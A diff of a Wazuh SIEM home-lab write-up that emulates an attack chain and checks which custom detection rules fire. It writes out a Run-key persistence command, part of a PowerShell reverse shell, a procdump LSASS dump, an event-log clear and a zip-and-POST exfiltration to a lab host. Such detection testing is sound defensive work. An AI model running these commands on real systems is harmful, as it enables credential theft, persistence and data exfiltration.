 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterSvc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 ```
 
-![Figure 11 — Stage 7 evidence screenshot](../screenshot/Stage7_persistence.png)
+![Figure 11 — Stage 7 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage7_persistence.png)
 
-*Figure 11 — Stage 7 evidence screenshot (as placed in the original writeup, 2026-08-28 run).*
+*Figure 11 — Stage 7 evidence screenshot (original 2026-08-28 run).*
 
 **First attempt (2026-08-28) — alert observed**
 
@@ -456,7 +460,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterSvc" /t 
 
 After chaining `100406` under the built-in rule (`<if_sid>92302</if_sid>` instead of the original `<if_group>sysmon_event_13</if_group>`, see `docs/03` §3.3) and reloading the ruleset, the same `reg add ... /v UpdaterSvc` command was re-run:
 
-![Figure 12 — Stage 7 re-test, 2026-10-13: custom rule `100406` fires alongside built-in rules](../screenshot/stage7_new.png)
+![Figure 12 — Stage 7 re-test, 2026-10-13: custom rule 100406 fires alongside built-in rules](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage7_new.png)
 
 *Figure 12 — `100406` (level 10) and `92041` (level 10) both fire at 20:38:27; an earlier run at 20:34:20 shows only the built-in `92302` (level 6), from before the fix was applied.*
 
@@ -466,14 +470,14 @@ After chaining `100406` under the built-in rule (`<if_sid>92302</if_sid>` instea
 | `100406` | 10 | 20:38:27.044 | **Custom** — "Sysmon: Registry Run key modified..." |
 | `92041` | 10 | 20:38:27.043 | Built-in — "Value added to registry key has Base64-like pattern" |
 
-See [`threat-emulation/evidence-logs/stage07-sysmon-registry-custom-rule.json`](../threat-emulation/evidence-logs/stage07-sysmon-registry-custom-rule.json) for the raw `100406` alert.
+See [`threat-emulation/evidence-logs/stage07-sysmon-registry-custom-rule.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage07-sysmon-registry-custom-rule.json) for the raw `100406` alert.
 
 **Analysis — re-test**
 
-- **The `if_sid` fix works.** `100406` now fires as a proper child of `92302` — since `if_sid=92302` is a strict precondition, `92302` itself must also have matched this exact event (its row is not separately visible in Figure 12's three captured rows, but it is a logical requirement of the chain firing at all).
-- **A second built-in rule, `92041`, also fires** on the same event, flagging the written value as having a "Base64-like pattern". The actual value (`C:\Windows\System32\calc.exe`) is not Base64, so this looks like a built-in heuristic being broad rather than a real encoding match — worth knowing about if `92041` shows up elsewhere, but it does not affect `100406`'s correctness.
+- **The `if_sid` fix works.** `100406` now fires as a proper child of `92302` — since `if_sid=92302` is a strict precondition, `92302` itself must also have matched this exact event (only the deepest matching rule is reported, so no separate `92302` row is expected for this event).
+- **`92041` ("Base64-like pattern") appears 1 ms earlier.** One event yields one alert, so this is most likely a separate Sysmon event for the same `reg add` (compare `eventRecordID`s; only `100406`'s record, 2875786, is exported). The written value is not Base64, so `92041` looks like a broad built-in heuristic; it does not affect `100406`.
 - **Earlier run (20:34:20) vs. re-test (20:38:27)**: the first timestamp, with only `92302` at level 6, is consistent with testing *before* the `if_sid` fix was applied; the second, four minutes later with `100406` present, is consistent with testing *after*. This reads as the same fix-then-retest pattern already seen in Stage 5.
-- **Group-name defect visible in this alert:** `100406`'s inner `<group>` ends with a trailing comma (`persistence,registry,`), and the raw alert's `rule.groups` is `sysmon_local`, **`windowspersistence`**, `registry` — `windows` and `persistence` merged into one name, so a filter on `rule.groups: windows` would miss it (compare `100408`/`100401`, whose strings have no trailing comma and show clean arrays). Detection itself is unaffected. See `docs/03` §5, item 16.
+- The stored alert reports `rule.groups` as `sysmon_local`, `windowspersistence`, `registry`: the outer group name and `persistence` were concatenated (`docs/03` §5 item 16).
 
 **Verdict: ✅ Detected by custom rule** (`100406`), confirmed via the 2026-10-13 re-test — closes the Stage 7 gap.
 
@@ -502,9 +506,9 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 $client.Close()
 ```
 
-![Figure 13 — Stage 8 evidence screenshot](../screenshot/Stage8_C2.png)
+![Figure 13 — Stage 8 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage8_C2.png)
 
-*Figure 13 — Stage 8 evidence screenshot (as placed in the original writeup).*
+*Figure 13 — Stage 8 evidence screenshot (original run).*
 
 **Alert observed**
 
@@ -513,7 +517,7 @@ $client.Close()
 | Rule | `100304` (sid `1000006`, rev 2) — possible reverse shell, suspicious outbound port, level 12 |
 | Time | 2026-08-29 07:45:49 |
 | Connection | `192.168.60.1:62602` → `192.168.60.135:4444`, TCP |
-| Flow | 1 packet to server (66 bytes), 0 to client — the first packet only |
+| Flow | 1 packet to server (66 bytes), 0 to client — read from the Figure 13 screenshot; the exported JSON has no `flow` object |
 | MITRE | T1071 / TA0011 |
 
 **Analysis**
@@ -543,28 +547,30 @@ procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_test.dmp
 
 With Sysmon's `ProcessAccess` (Event ID 10) now enabled (`docs/03` §3.1), the endpoint started logging every process that touches `lsass.exe` — including Defender's own real-time-protection engine:
 
-![Figure 14 — Stage 8b: Windows Defender's `MsMpEng.exe` accessing LSASS, flagged by a built-in rule](../screenshot/stage8b_dump.png)
+![Figure 14 — Stage 8b: Windows Defender's MsMpEng.exe accessing LSASS, flagged by a built-in rule](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage8b_dump.png)
 
 *Figure 14 — Three occurrences of the built-in `92900` alert for routine Defender activity; `100411` does not appear.*
 
 | Field | Value |
 |---|---|
 | Rule | `92900` — built-in, "Lsass process was accessed... possible credential dump", level 12 (T1003.001) |
-| Time | 2026-10-13 21:02–21:03 local (UTC+7), three occurrences in Figure 14; the raw JSON below is a later occurrence of the same activity at 23:30:43 local (16:30:43 UTC) |
+| Time | Screenshot: 2026-10-13 21:02–21:03 local (three occurrences). The exported JSON is a different occurrence: 16:30:43 UTC = 23:30 local |
 | Source | `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.4-0\MsMpEng.exe` (`sourceUser: NT AUTHORITY\SYSTEM`) |
 | `grantedAccess` | `0x101000` |
 | `callTrace` | Entirely inside `mpengine.dll` (Defender's scanning engine) and system DLLs — no third-party or unbacked code |
 
-See [`threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-windowsdefender.json`](../threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-windowsdefender.json) for the raw alert.
+See [`threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-windowsdefender.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-windowsdefender.json) for the raw alert.
 
 **Analysis**
 
-- **This confirms `100411`'s filters are working as designed, not failing.** `100411` requires `sourceImage` to be outside an allow-list that specifically includes Defender's `MsMpEng.exe` under `Windows Defender\Platform\...` (path-matched), **and** `grantedAccess` to be one of a short list of memory-read masks (`0x1010`, `0x1410`, `0x1438`, `0x143a`, `0x1f0fff`, `0x1f1fff`, `0x1f3fff`, `0x1fffff`). Here, `sourceImage` matches the Defender allow-list *and* `grantedAccess` (`0x101000`) matches neither condition independently blocks the alert, so `100411` correctly stayed silent for this event.
-- **The built-in `92900` has no equivalent filtering** and flags the same routine scan as "possible credential dump" at level 12, three times in under a minute. This is a concrete, evidenced example of the custom rule being more precise than the stock ruleset for this exact scenario.
+- **What the silence proves.** `100411` needs `grantedAccess` to be one of a short list of memory-read masks (`0x1010`, `0x1410`, …); `0x101000` is not in it, so the rule stays silent for this event regardless of anything else. That is the only filter this event proves. The `MsMpEng.exe` allow-list is **not** proven: the exported `eventdata.sourceImage` contains doubled backslashes (`C:\\ProgramData\\Microsoft\\…` after JSON decoding, while `message` has single ones) but the allow-list regex expects single ones, and the `if_group` name (`sysmon_event_10`) is also unverified. Silence is consistent with a broken rule; it does not demonstrate a working one.
+- **The built-in `92900` has no equivalent filtering** and flags the same routine scan as "possible credential dump" at level 12, three times in under a minute. Whether the custom rule is more precise than the stock one still needs the positive control below.
 - **This is not evidence that `100411` can detect a real LSASS dump** — it only shows the rule correctly ignoring benign traffic. The positive case (a tool like ProcDump actually reading LSASS memory) has not been tested.
 - `100416` (the `callTrace`-based escalation, chained under `100411`) also has not been exercised — this Defender event's `callTrace` stays inside `mpengine.dll`/system DLLs the whole way, so even if `100411` had fired, `100416` would not have added anything here.
 
-**Verdict: ⚠️ False positive correctly suppressed; true positive still not evidenced** — stage `procdump.exe` on the victim (or substitute another LSASS-access tool) and re-run; see §7.
+**Cheap positive control (no dump tool needed):** take the stored `full_log` of this event and run it through `wazuh-logtest` twice — unchanged (expect `92900`), then with `sourceImage` set to a non-allow-listed path and `grantedAccess` set to `0x1fffff` (expect `100411`; edit `callTrace` to contain `dbghelp.dll` to expect `100416`). If the second run does not produce `100411`, fix the rule before staging a real dump tool.
+
+**Verdict: ⚠️ Telemetry confirmed; rule filters unproven; true positive not evidenced** — run the positive control, then stage `procdump.exe` (or an equivalent tool) and re-run; see §7.
 
 ---
 
@@ -572,20 +578,20 @@ See [`threat-emulation/evidence-logs/stage08b-rule-100411-lsass-false-positive-w
 
 ```powershell
 # through the reverse shell
-Add-Content -Path C:\Users\LENOVO\Downloads\virustotaltest\eicar.com -Value "modified"
-Remove-Item C:\Users\LENOVO\Downloads\virustotaltest\eicar2.txt -Force
+Add-Content -Path C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com -Value "modified"
+Remove-Item C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com -Force
 ```
 
-![Figure 15 — Stage 9 evidence screenshot](../screenshot/Stage9_fim.png)
+![Figure 15 — Stage 9 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage9_fim.png)
 
-*Figure 15 — Stage 9: file modified and file deleted, as placed in the original writeup.*
+*Figure 15 — Stage 9: file modified and file deleted, original run.*
 
 **Analysis**
 
 - With `realtime="yes"` on the monitored folder, Wazuh's syscheck raises an alert for each change: "integrity checksum changed" (rule `550`, level 7) when the content is modified, and a deletion alert when the file is removed.
 - This stage covers the part of an intrusion that leaves traces on disk after the payload landed in Stage 6: tampering with, and removal of, files.
 - The evidence is a screenshot; no raw alert is preserved.
-- File names differ between stages (`eicar2.com` is created in Stage 6, `eicar2.txt` is deleted here). Use the same names so the story is traceable.
+- File names are consistent: `eicar2.com` is created in Stage 6, then modified and deleted here (as in `09-file-lifecycle_windows.ps1`).
 
 **Verdict: ✅ Detected** (screenshot evidence only).
 
@@ -618,7 +624,7 @@ Clear-EventLog -LogName Security
 
 `100412`'s parent was corrected to `<if_sid>60002</if_sid>` (the documented ancestor of every eventchannel Security event, per `docs/03` §3.3) and the log-clear command was re-run:
 
-![Figure 16 — Stage 10 re-test, 2026-10-13: custom rule `100412` fires twice, no `63103` visible](../screenshot/stage10_cleanup.png)
+![Figure 16 — Stage 10 re-test, 2026-10-13: custom rule 100412 fires twice, no 63103 visible](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage10_cleanup.png)
 
 *Figure 16 — Two `100412` alerts (23:28:52 and 23:28:56), interleaved with `100400` "Shell spawned child process" entries showing `cmd.exe` as a parent — confirming `100400`'s shell-parent list now includes `cmd.exe`.*
 
@@ -629,7 +635,7 @@ Clear-EventLog -LogName Security
 | `100400` | 5 | 23:28:53.689 | `cmd.exe` spawned a child process |
 | `100412` | 15 | 23:28:56.018 | **Custom** — "CRITICAL: Windows Security Event Log cleared" |
 
-The raw alert is [`stage10-rule-100412-excerpt.json`](../threat-emulation/evidence-logs/stage10-rule-100412-excerpt.json) — despite the file name (a leftover from an earlier condensed excerpt) it is now a full raw alert: rule `100412`, level 15, `firedtimes: 2`, Event `1102`, timestamp `2026-10-13T16:28:56Z` (= 23:28:56 local, matching Figure 16). Its `rule.groups` reads `sysmon_local`, **`windowslog_cleared`**, `anti_forensics` — the merged-name defect described in Stage 7 and `docs/03` §5, item 16.
+Raw alert for the second occurrence: [`stage10-rule-100412-excerpt.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage10-rule-100412-excerpt.json) — despite the file name it is a full export (`firedtimes: 2`, level 15, `full_log`); consider renaming it.
 
 **Analysis — re-test**
 
@@ -641,70 +647,73 @@ The raw alert is [`stage10-rule-100412-excerpt.json`](../threat-emulation/eviden
 
 ---
 
-### Stage 11 — Exfiltration (T1059.001, T1567.002)
+### Stage 11 — HTTP Transfer / Exfiltration Simulation (T1059.001; T1048.003 conditional)
 
-> **Environment note:** the lab's Wazuh manager and attacker VMs crashed and are being rebuilt as of this writing. Everything below is the rule's intended design and the procedure that would exercise it — not a test result. No alert, screenshot, or log claims otherwise; the verdict stays `❌ Not evidenced` until a live re-test is possible.
+**Source of truth:** [`11-exfiltration_windows.ps1`](../threat-emulation/attack-scripts/11-exfiltration_windows.ps1) and [`11-exfiltration_kali.sh`](../threat-emulation/attack-scripts/11-exfiltration_kali.sh) as committed. This is **not** the Stage 8 `TCPClient` reverse shell. The older port-4445 raw-socket transfer is historical and no longer matches the committed Windows Stage 11 script.
 
-**Rule rewritten since the plan above was written.** `100413` no longer watches for a network connection on port 4445 — it now reads PowerShell's own Module Logging output for an `Invoke-WebRequest` call that names a remote `Uri` and either `-Method Post` or `-InFile` (see `docs/03` §3.3). The procedure below has been updated to match; the original `TCPClient`/port-4445 version is kept in `threat-emulation/attack-scripts/` history only as a reference for how `100404`/`100414` could still catch a *non-PowerShell-logged* transfer.
-
-```bash
-# Kali — receive the file (simple HTTP listener instead of a raw nc socket)
-python3 -m http.server 8000 &
-# or a small script that accepts POST and saves the body, if a true upload endpoint is wanted
-# we can using netcat command for executing data exfiltration
-nc -lvnp 4445 
-```
+**Current Windows procedure (committed, not evidence of successful transfer):**
 
 ```powershell
-# Windows — through the reverse shell
 Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force
-
 Invoke-WebRequest -Uri "http://192.168.60.135:8000/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
 ```
 
-**Preconditions — not yet met, confirmed against the current repo:**
+**Current Kali script (committed):**
 
-1. `ossec.conf` needs a new `<localfile>` block for `Microsoft-Windows-PowerShell/Operational` (`log_format: eventchannel`) — not present yet, so Wazuh never sees the event regardless of what runs.
-2. Windows Module Logging must be turned on via Group Policy (*Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging*) — without it, the event fires but `ContextInfo`/`Payload` stay empty and the rule's fields won't match.
-3. `threat-emulation/attack-scripts/11-exfiltration_windows.ps1` still has the old `TCPClient`/port-4445 version (and a pre-existing filename bug — it compresses to `exfil_test.zip` but reads back `exfil_data.zip`) — needs updating to the `Invoke-WebRequest` form above before it will exercise `100413`.
+```bash
+python3 -m http.server 8000
+# Subsequent `nc -lvnp 4445` is not reached until the server exits;
+# it also listens on a different port than the Windows HTTP request.
+```
 
-**Status:** no alert, no screenshot, no file-integrity check — unchanged from before, but now additionally blocked on the two telemetry preconditions above, not just on running the procedure.
+Stock Python `http.server` does **not** implement a POST upload handler that saves the request body to disk. A request line visible in the server terminal is not proof that a ZIP was received intact. If a separate receiver was used in an actual experiment, its code and a saved received file are **not currently in this repository**. The current files do not establish a successful file-transfer outcome. An HTTP receiver that actually stores the POST body, plus a hash comparison, is needed for a reproducible end-to-end result.
 
-**What a complete run should show**
+**Detection engineering alignment.** Custom Wazuh `100413` searches PowerShell Module Logging fields `win.eventdata.contextInfo` (containing `Invoke-WebRequest`) and `win.eventdata.payload`, as a child of built-in `60009`. The agent's committed `ossec.conf` **already includes** `Microsoft-Windows-PowerShell/Operational`, but the policy enabling Module Logging (4103), event field extraction, built-in parent chain and positive `100413` alert are **not verified**. The regex targets web-request activity, **not independent proof of exfiltration**. Sysmon `100404` can provide a more generic process-network signal if an eligible EID 3 event is generated.
 
-| Check | Expected result |
-|---|---|
-| PowerShell Operational | `Invoke-WebRequest` logged with the upload's `Uri`/`Post`/`InFile` in `Payload` → alert `100413` |
-| Sysmon EID 3 (fallback layer) | `powershell.exe` → `192.168.60.135:8000` — if port 80/443 is used instead, `100414` can also fire independently of `100413`; on an arbitrary port, only `100404` (generic PowerShell network connection) applies |
-| File creation | Zip written under `\Windows\Temp\` — candidate for `100405` if Sysmon logs the extension |
-| Data arrived | `Get-FileHash` of `exfil_test.zip` on Windows equals the hash of the file received on Kali |
+| Check | Evidence required | Current status |
+|---|---|---|
+| Local archive created | `exfil_test.zip` exists and has a SHA256 on Windows | Script configured; no preserved outcome |
+| HTTP transfer requested | Windows request to Kali `:8000/upload`, plus matching Kali-side record | No preserved request/response evidence |
+| ZIP received in full | Kali receiver saves ZIP; SHA256 matches Windows | **Unverified with committed listener** |
+| PowerShell telemetry | Windows Operational EID 4103 with relevant `contextInfo`/`payload` | Channel configured; 4103 activation/ingestion unverified |
+| Wazuh detection | Raw `rule.id: 100413` alert with original event fields | Not captured |
+| Alternate network alert | Raw Sysmon EID 3 and rule `100404`, if observed | Not captured for this Stage 11 run |
 
-Content-based detection (matching the PowerShell command itself) is a real improvement over the old hard-coded port, but it only sees the upload if Module Logging is on and the attacker's tooling is PowerShell `Invoke-WebRequest` specifically — a `curl.exe`, raw socket, or `System.Net.WebClient` upload would not trigger `100413` at all, though `100404`/`100414` could still catch the network side of it.
+**ATT&CK interpretation:** `T1059.001` accurately describes execution via PowerShell. Sending data to a Kali-hosted **HTTP** endpoint is **not** `T1567.002` (cloud storage). For a verified unencrypted HTTP transfer independent of the C2 channel, `T1048.003` may describe the simulated exfiltration procedure; if the same C2 channel carries the data, reassess `T1041`. Neither label should be treated as proof that transfer succeeded.
 
-**Verdict: ❌ Not evidenced** — highest-priority item to complete, and now gated on the two preconditions above before a re-test is even worth attempting.
+**Verdict: ❌ No preserved Stage 11 detection or completed transfer evidence.** The Stage 11 Windows script and intended detection are aligned, but neither raw `100413` alerts nor end-to-end file integrity have been demonstrated by committed evidence.
 
 ---
 
 ## 5. Attack Timeline (UTC)
 
-The chain was run in three sessions: Stages 1–7 on 2026-08-28, Stages 8–10 on 2026-08-29, and a standalone Stages 2–3 re-test on 2026-10-10. A preliminary, inconclusive attempt was also made 2026-10-09. Times are taken from the preserved alerts (event time, UTC).
+The chain was run in several sessions: Stages 1–7 on 2026-08-28, Stages 8–10 on 2026-08-29, a standalone Stages 2–3 re-test on 2026-10-10, and standalone Stage 5, 7, 8b and 10 re-tests on 2026-10-13. A preliminary, inconclusive attempt was also made 2026-10-09. Times are taken from the preserved alerts (event time, UTC); the Stage 7, 8b and 10 re-test rows below are converted from the local (UTC+7) timestamps quoted in Section 4.
 
 | Stage | Date and time | Event | Source |
 |---|---|---|---|
 | 1 | 2026-08-28 05:32:14 | pfSense burst alert (loopback DNS, not attributable to the scan) | pfSense `100140` |
 | 2 | 2026-08-28 05:45:44 | Repeated SSH connection attempts from Kali | Suricata `100301` |
-| 2 | 2026-08-28 05:46:41 | Failed logon through `sshd.exe` (`lenovo`) | Windows `60122` |
-| 3 | 2026-08-28 05:46:41 | Account `LENOVO` locked out | Windows `60115` |
+| 2 | 2026-08-28 05:46:44 | Failed logon through `sshd.exe` (`lenovo`) | Windows `60122` |
+| 3 | 2026-08-28 05:46:44 | Account `LENOVO` locked out | Windows `60115` |
 | 4 | 2026-08-28 06:34:55 | Encoded PowerShell command | Sysmon `100401` |
 | 5 | 2026-08-28 06:48:04 | `net1 localgroup administrators` | Sysmon `92031` (built-in) |
 | 6 | 2026-08-28 07:09:53 | EICAR file downloaded over HTTP | Suricata `100306` |
 | 7 | 2026-08-28 07:46:46 | `UpdaterSvc` Run key written | Sysmon `92302` (built-in) |
 | 8 | 2026-08-29 07:45:49 | Outbound connection to Kali on port 4444 | Suricata `100304` |
-| 8b, 9, 11 | — | No timestamp preserved in the writeups | — |
+| 9, 11 | — | No timestamp preserved | — |
 | 10 | 2026-08-29 08:39:25 | Security log cleared (Event `1102`) | Windows `63103` (built-in) |
 | 2 (preliminary) | 2026-10-09 ~08:05 | Failed-logon burst, but `ipAddress` shows the victim's own IP (artifact) | Windows `100408` |
 | 2 (re-test) | 2026-10-10 17:37:52 | Failed-logon burst, correct `ipAddress` | Windows `100408` |
 | 3 (re-test) | 2026-10-10 17:38:11 | Successful logon, 18s after the burst above | Windows `92657` (built-in) |
+| 5 (re-test) | 2026-10-13 05:04:30 | `whoami.exe` — reconnaissance binary | Sysmon `100402` |
+| 5 (re-test) | 2026-10-13 05:04:34 | Recon burst correlation (`whoami` → `tasklist` → `systeminfo`) | Sysmon `100407` |
+| 5 (re-test) | 2026-10-13 05:04:38 | `ARP.EXE` spawned by `powershell.exe` | Sysmon `100400` |
+| 5 (re-test) | 2026-10-13 05:04:42 | `net.exe` / `net1.exe` — reconnaissance binaries | Sysmon `100402` |
+| 7 (re-test) | 2026-10-13 13:34:21 | `UpdaterSvc` Run key written again, before the `if_sid` fix | Sysmon `92302` (built-in) |
+| 7 (re-test) | 2026-10-13 13:38:27 | `UpdaterSvc` Run key written, custom rule fires alongside built-in `92041` | Sysmon `100406` |
+| 8b | 2026-10-13 16:30:43 | Windows Defender's own LSASS scan (exported alert; the screenshot shows earlier occurrences at about 14:02–14:03 UTC) | Sysmon `92900` (built-in) |
+| 10 (re-test) | 2026-10-13 16:28:52 | Security log cleared (1st of two), custom rule fires | Windows `100412` |
+| 10 (re-test) | 2026-10-13 16:28:56 | Security log cleared (2nd), custom rule fires again | Windows `100412` |
 
 ---
 
@@ -714,7 +723,7 @@ The chain was run in three sessions: Stages 1–7 on 2026-08-28, Stages 8–10 o
 |---|---|---|---|---|---|
 | 1 Reconnaissance | `100300`, `100130`, `100201` | `100140` (unrelated traffic) | pfSense | ❌ | ⚠️ |
 | 2 Brute Force | `100301`, `100408` | `100301`, `60122`, `100408` (re-test) | Suricata, Windows | ✅ | ✅ |
-| 3 Successful Access | `100410` | `92657` (built-in, re-test) | Windows | ❌ | ⚠️ |
+| 3 Successful Access | `100410` (current revision pending retest) | `92657` (built-in, 2026-10-10 historical retest) | Windows | ❌ | ⚠️ |
 | 4 Execution | `100401` | `100401` | Sysmon | ✅ | ✅ |
 | 5 Discovery | `100400`, `100402`, `100407` | `100402`, `100407`, `100400` (re-test) | Sysmon | ✅ | ✅ |
 | 6 Payload Drop | `100306` | `100306`, FIM, `87105` | Suricata, FIM, VirusTotal | ✅ | ✅ |
@@ -723,37 +732,36 @@ The chain was run in three sessions: Stages 1–7 on 2026-08-28, Stages 8–10 o
 | 8b LSASS | `100411` | `92900` (built-in, false positive); `100411` correctly silent | Sysmon | n/a (true positive not tested) | ⚠️ |
 | 9 File Lifecycle | FIM modified / deleted | syscheck (screenshot) | FIM | n/a | ✅ |
 | 10 Anti-Forensics | `100412` | `100412` (re-test, child of `60002`) | Windows | ✅ | ✅ |
-| 11 Exfiltration | `100413` | none | — | ❌ | ❌ |
+| 11 HTTP Transfer / Exfiltration Simulation | `100413` | none preserved | PowerShell (planned), Sysmon (fallback) | ❌ | ❌ |
 
 **Reading the results**
 
-- **Behaviour coverage and rule coverage converged.** Nine of twelve steps are now detected (eight with a raw alert, one by screenshot), and seven of them by the designed custom rule — up from four at the end of the original 2026-08-28/29 run.
-- **The precedence pattern (`docs/03` §5, item 2) is now resolved for Stages 5, 7 and 10.** Two different fixes worked: chaining the custom rule as an explicit child of the winning built-in rule (`100406`→`92302`, `100412`→`60002`) and, for Stage 5, simply widening `100402`'s own matching scope so there was no sibling to lose to. **Stage 3 is the one case left unresolved** — `100410` still uses `if_sid=60106` (the generic parent both it and the built-in `92657` share) rather than chaining under `92657` directly, and a separate change raised its `frequency` from `1` to `2`, likely raising the bar further.
-- **Stage 8b is a genuine false-positive success story, not a gap in reasoning.** The custom `100411` correctly ignored Windows Defender's own LSASS scan while the built-in `92900` flagged it — but this says nothing about whether `100411` would catch a real LSASS dump, which still needs `procdump` (or an equivalent tool) staged and run.
+- **Coverage is partial, not a complete end-to-end chain.** The saved results include seven stages with raw alerts from their expected custom rule, Stage 3 supported only by built-in `92657`, and Stage 9 supported by screenshots. Stage 1 and Stage 11 lack convincing stage-specific proof; optional Stage 8b lacks a positive LSASS test. Stage 0 is setup, not an attack action.
+- **Precedence and configuration history:** Stages 5, 7 and 10 have positive retest evidence. For Stage 3, the 2026-10-10 test matched built-in `92657`; current XML has since changed to `if_sid=92657`, but `100410` has **not** been validated after that change. Do not describe the old `60106` parent or historical `frequency=2` as the live configuration.
+- **Stage 8b shows telemetry, not detection quality.** Defender's scan reached the rule engine and only the built-in `92900` alerted; that does not show that `100411`'s filters work (see Stage 8b), and a real LSASS access has not been tested.
 - Network detections (Suricata) remain reliable: three of the seven custom rules proven are Suricata rules; the rest are now Sysmon/Windows rules after the latest re-tests.
 
 ---
 
 ## 7. Gap Analysis and Re-test Plan
 
-| Priority | Stage | Gap | Action | Pass criteria |
+Priority is based on **current committed scripts/configuration**, while historical evidence is retained in Section 4.
+
+| Priority | Stage | Current gap | Action | Pass criteria |
 |---|---|---|---|---|
-| P1 | 11 | No evidence; `100413` was rewritten to detect `Invoke-WebRequest` via PowerShell Module Logging instead of port 4445, but the required telemetry (ossec.conf localfile + GPO) isn't collected yet, and the attack script still uses the old `TCPClient` approach | Add the `Microsoft-Windows-PowerShell/Operational` localfile to `ossec.conf`, enable Module Logging via GPO, update `11-exfiltration_windows.ps1` to use `Invoke-WebRequest -Method Post -InFile`, then run it | Raw alert `100413`; file hashes match on both hosts |
-| P1 | 8b | No true-positive test run — `procdump.exe` is not staged on the victim; only Defender's own benign LSASS scan has been observed (correctly ignored by `100411`) | Stage `procdump.exe` (or an equivalent LSASS-access tool) on the victim and run it through the reverse shell | Raw alert `100411` (and, if the call trace shows `dbghelp.dll`/`dbgcore.dll`, `100416`) with `sourceImage: procdump.exe` |
-| P1 | 3 | `100410` still uses `if_sid=60106` (shared with the winning built-in `92657`) instead of chaining under `92657` directly; `frequency` was also raised from `1` to `2`, which may independently prevent it from firing on a single brute-force-then-login sequence | Change to `<if_sid>92657</if_sid>`; revert `frequency` to `1` unless multiple bursts are specifically intended; re-run the Stage 2→3 sequence once | Raw `100410` alert alongside (or instead of) `92657` |
-| P1 | 1 | WAN-side re-test attempted, no clean evidence (suspect NAT hairpin, see Stage 1) | Repeat the WAN-side scan with `tcpdump` on both pfSense interfaces (WAN and LAN) simultaneously | Confirm whether the true source IP survives the NAT hop; raw `100300` or pfSense alert with a genuine external `srcip` |
-| P1 | — | **Group strings corrupted**: inner `<group>` strings for `100400`, `100402`, `100406`, `100412`, `100415`, `100416` end with a trailing comma, and the raw alerts for `100406`/`100412` show merged names (`windowspersistence`, `windowslog_cleared`) instead of a separate `windows` entry. Rules still fire; group-based filtering and the Dashboard's Manage Rules page are affected (the latter per the README's earlier HTTP 500 incident) | Remove the trailing commas, reload, re-run one test per affected rule | Raw alert shows `windows` as its own entry in `rule.groups`; rules open cleanly in Manage Rules |
-| ~~P2~~ | ~~2, 3~~ | ~~SSH `4625` has no `ipAddress`~~ | **Partially resolved**: the 2026-10-10 re-test's `4625`/`4624` events (over SMB) do carry `ipAddress`, so `same_field ipAddress` correlation is viable for that access path. Still unconfirmed for a pure OpenSSH `logonType 8` login (the original Stage 2 evidence) — re-test that specific path before relying on `ipAddress` correlation for it | — |
-| ~~P3~~ | ~~5~~ | ~~`100402` does not cover `net`, `net1`, `arp`~~ | **Resolved for `net`/`net1`** (2026-10-13 re-test, confirmed raw alerts); `arp` confirmed still absent from the pattern (current rule XML reviewed) | — |
-| ~~P3~~ | ~~5~~ | ~~Whether `100400`'s `parentImage` was widened beyond `powershell.exe`~~ | **Resolved**: confirmed via current rule XML and Figure 16 — now `(?i)(?:powershell\|pwsh\|cmd\|net)\.exe$` | — |
-| P3 | 5 | `arp.exe` still not in `100402`'s pattern (only caught generically by `100400`) | Add `arp` if parity with `net`/`net1`/`whoami` is wanted | Raw `100402` alert for `arp.exe` |
-| P3 | 5 | Built-in `92031` not observed alongside the custom rules in two separate Discover views (Figures 6, 7), but not exhaustively searched | Search Discover for `rule.id: 92031` in the same time window as the 2026-10-13 re-test | Confirm presence or absence |
-| P3 | 7 | Built-in `92041` ("Base64-like pattern") also fired alongside `100406` for a plain file path (`calc.exe`), which is not Base64 — looks like a broad built-in heuristic | No action needed for `100406`'s correctness; worth knowing `92041` can be noisy if relied on elsewhere | — |
-| P3 | 6 | `1000011` does not match `.com` | Add `com`, `scr`, `vbs`, `js`, `msi` to the extension list | Alert on the EICAR URL |
-| P3 | 8 | Evidence is from rule revision 2 | Re-run with the listener up so the handshake completes | `100304` fires on revision 3 |
-| P3 | 6, 9 | FIM and VirusTotal evidence are screenshots | Export raw alert JSON and note the rule IDs | Raw JSON stored in the repository |
-| P3 | 3 | Re-test used SMB (`hydra ... smb://`, `smbclient`), confirmed — but no Suricata evidence captured for this protocol/session, and the original SSH `logonType 8` / no-`ipAddress` question (Stage 2) is still separately open | Capture Suricata `100303` (SMB Port Probe) for an SMB-based brute force; separately, re-run explicitly over SSH if a clean SSH-specific `4624`/`ipAddress` pair is still needed | Raw `100303` alert for the SMB run; raw SSH `4624` with populated `ipAddress`, if that path is re-tested |
-| P3 | All | Command typos hurt reproducibility | Apply the corrections in [Appendix C](#appendix-c--reproducibility-notes) | — |
